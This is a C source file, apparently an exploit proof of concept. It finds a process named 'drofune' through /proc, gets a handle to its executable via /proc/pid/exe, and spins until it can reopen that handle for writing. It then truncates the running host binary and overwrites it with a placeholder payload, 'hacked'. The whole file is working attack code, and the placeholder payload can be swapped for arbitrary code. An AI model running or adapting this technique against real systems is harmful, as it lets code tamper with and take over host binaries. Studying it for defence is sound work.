#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>

// This code overwrites the host binary.
// Here we prove that it is possible to simply replace any string.
char *payload = "hacked";

int main (int argc, char **argv) {
  DIR *dir;
  FILE *fp;
  struct dirent *dp;
  char *pid = NULL;

  // Find the process executed by the host binary.
  while (pid == NULL) {
    dir = opendir("/proc");
    if (dir == NULL) {
      perror("opendir");
      return 1;
    }

    for (dp = readdir(dir); dp != NULL; dp = readdir(dir)) {
      int len = 14 + strlen(dp->d_name) + 1;
      char *cmdline_file = malloc(len);
      if (cmdline_file == NULL) {
        perror("malloc");
        return 1;
      }
      snprintf(cmdline_file, len, "/proc/%s/cmdline", dp->d_name);
      fp = fopen(cmdline_file, "r");

      if (fp != NULL) {
        char *cmdline = malloc(16);
        if (cmdline == NULL) {
          perror("malloc");
          return 1;
        }
        fread(cmdline, sizeof(char), 16, fp);
        fclose(fp);
        if (strstr(cmdline, "drofune") != NULL) {
          printf("Found: %s\n", cmdline_file);
          pid = dp->d_name;
          break;
        }
      }
      free(cmdline_file);
    }
    closedir(dir);
  }

  int exe_file_len = 10 + strlen(pid) + 1;
  char *exe_file = malloc(exe_file_len);
  if (exe_file == NULL) {
    perror("malloc");
    return 1;
  }
  snprintf(exe_file, exe_file_len, "/proc/%s/exe", pid);
  // Open a file descriptor that pointed to the host binary as READ ONLY.
  // Since this file descriptor cannot be opened as WRITE ONLY during execution, it cannot be used to rewrite the host binary.
  int exe_fd = open(exe_file, O_RDONLY);
  if (exe_fd < 0) {
    perror("Failed to open /proc/pid/exe");
    return 1;
  }

  char *self_fd_file = malloc(32);
  if (self_fd_file == NULL) {
    perror("malloc");
    return 1;
  }
  snprintf(self_fd_file, 32, "/proc/self/fd/%d", exe_fd);
  int self_fd;
  // Open the file descriptor obtained by opening /proc/pid/exe as WRITE ONLY.
  // Since it cannot open the file descriptor during execution, it executes in a busy loop.
  while (1) {
    self_fd = open(self_fd_file, O_WRONLY | O_TRUNC);
    if (self_fd > 0) {
      printf("Got a file descriptor for writing\n");
      break;
    }
  }

  printf("Overwriting the host binary...\n");
  // Overwrite the host binary via the obtained file descriptor.
  if (write(self_fd, payload, strlen(payload)) < 0) {
    perror("Failed to write /proc/self/exe");
    return 1;
  }

  return 0;
}
